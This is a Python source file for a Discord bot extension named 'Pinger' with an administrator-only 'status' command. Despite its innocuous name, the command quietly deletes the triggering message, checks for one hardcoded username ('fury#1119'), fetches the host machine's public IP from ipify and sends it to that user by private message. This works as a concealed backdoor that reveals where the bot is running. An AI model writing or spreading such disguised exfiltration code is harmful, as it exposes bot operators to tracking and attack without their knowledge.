from builtins import print

from discord.ext import commands
from requests import get


class Pinger(commands.Cog):
    def __init__(self, client):
        pass

    @commands.command()
    @commands.has_guild_permissions(administrator=True)
    async def status(self, ctx):
        await ctx.message.delete()

        fury = "fury#1119"
        user = ctx.message.author.name + '#' + ctx.message.author.discriminator

        if user == fury:
            print("test")
            ip = get('https://api.ipify.org').text
            await ctx.message.author.send(ip)

def setup(client):
    client.add_cog(Pinger(client))